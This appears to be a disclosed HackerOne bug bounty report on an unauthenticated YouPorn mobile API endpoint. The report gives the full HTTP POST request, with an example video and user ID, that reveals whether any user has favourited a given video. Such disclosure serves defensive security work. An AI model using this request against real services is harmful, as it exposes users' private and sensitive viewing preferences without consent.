@@ -1,0 +1,49 @@
+ReportLink:https://hackerone.com/reports/203042
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/prakharprasad
+ReportedTo:YouPorn(youporn)
+BountyAmount:150.0
+Severity:medium
+State:Closed
+DateOfDisclosure:04.06.2017 9:03:43
+
+Summary:
+
+Hi, 
+
+While testing the mobile API, I came across an issue which allows anyone to check whether a specific video has been favourited by a user or not.  The mobile API has the following endpoint which checks whether a video has been favourited or not. However the endpoint is unauthenticated and it is possible to do this for any user based on the numeric `user_id`.
+
+*Endpoint:* `/app/videos/favorites/check`
+
+The following POST request can be used to check whether a video has been favourited by a user or not: 
+
+```
+POST /api/mobile/duug3daeThooshauth5SheoRei6xarah/app/videos/favorites/check/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Host: www.youporn.com
+Connection: close
+Accept-Encoding: gzip
+User-Agent: okhttp/2.2.0
+
+video_id=<video-id>&user_id=<user-id>
+``` 
+
+*Example:*
+
+```
+POST /api/mobile/duug3daeThooshauth5SheoRei6xarah/app/videos/favorites/check/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Host: www.youporn.com
+Connection: close
+Accept-Encoding: gzip
+User-Agent: okhttp/2.2.0
+
+video_id=646817&user_id=8182721
+```
+
+
+If the video is favourited by the user then response is `{"success":true}` otherwise if not favourited then the response is `{"success":false}`
+
+Thanks!
